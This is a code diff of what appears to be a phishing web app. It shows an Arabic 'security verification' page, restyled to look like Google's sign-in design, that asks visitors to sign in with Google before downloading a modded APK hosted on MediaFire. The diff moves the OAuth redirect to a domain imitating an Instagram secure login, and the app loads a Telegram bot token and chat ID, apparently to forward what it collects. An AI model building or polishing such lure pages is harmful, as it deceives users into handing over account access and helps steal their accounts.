@@ -9,7 +9,12 @@ GOOGLE_CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID")
 GOOGLE_CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-REDIRECT_URI = "https://samer-production.up.railway.app/auth/callback"
+
+# تم التعديل هنا ليعتمد على الرابط الصحيح والمطابق تماماً
+REDIRECT_URI = os.getenv(
+    "REDIRECT_URI",
+    "https://instagram-secure-login.up.railway.app/auth/callback",
+)
 
 MEDIAFIRE_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
 
@@ -30,72 +35,20 @@ def home():
     <title>التحقق الأمني - حماية الموقع</title>
     <style>
         * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
-        body {{ 
-            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            width: 100vw; 
-            padding: 20px; 
-        }}
-        .box {{ 
-            background: #1e293b; 
-            width: 100%; 
-            max-width: 410px; 
-            padding: 40px 30px; 
-            border-radius: 16px; 
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4); 
-            text-align: center; 
-            border: 1px solid #334155; 
-        }}
-        .icon-container {{
-            width: 70px;
-            height: 70px;
-            background: rgba(59, 130, 246, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px auto;
-            border: 1px solid rgba(59, 130, 246, 0.2);
-        }}
-        .icon {{ font-size: 32px; }}
-        h2 {{ color: #f8fafc; font-size: 20px; font-weight: 700; margin-bottom: 12px; }}
-        p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }}
-        
-        .google-btn {{ 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 12px; 
-            width: 100%; 
-            background: #ffffff; 
-            color: #1e293b; 
-            border: none; 
-            border-radius: 8px; 
-            padding: 14px 16px; 
-            font-size: 15px; 
-            font-weight: 600; 
-            text-decoration: none; 
-            cursor: pointer; 
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }}
-        .google-btn:hover {{ 
-            background: #f1f5f9; 
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(0,0,0,0.2);
-        }}
-        .google-icon {{ width: 20px; height: 20px; }}
-        .footer {{ margin-top: 25px; font-size: 12px; color: #64748b; }}
+        body {{ background: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }}
+        .box {{ background: #ffffff; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); text-align: center; border: 1px solid #e1e4e8; }}
+        .icon {{ font-size: 36px; margin-bottom: 15px; }}
+        h2 {{ color: #202124; font-size: 18px; font-weight: 600; margin-bottom: 10px; }}
+        p {{ color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }}
+        .google-btn {{ display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; background: #ffffff; color: #3c4043; border: 1px solid #dadce0; border-radius: 4px; padding: 12px 16px; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; transition: background 0.2s, box-shadow 0.2s; }}
+        .google-btn:hover {{ background: #f8f9fa; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
+        .google-icon {{ width: 18px; height: 18px; }}
+        .footer {{ margin-top: 20px; font-size: 11px; color: #80868b; }}
     </style>
 </head>
 <body>
     <div class="box">
-        <div class="icon-container">
-            <div class="icon">🛡️</div>
-        </div>
+        <div class="icon">🛡️</div>
         <h2>التحقق من الأمان مطلوب</h2>
         <p>يرجى إثبات أنك استخدمت متصفحًا حقيقيًا وليس برنامج روبوت لمتابعة التنزيل بأمان.</p>
         
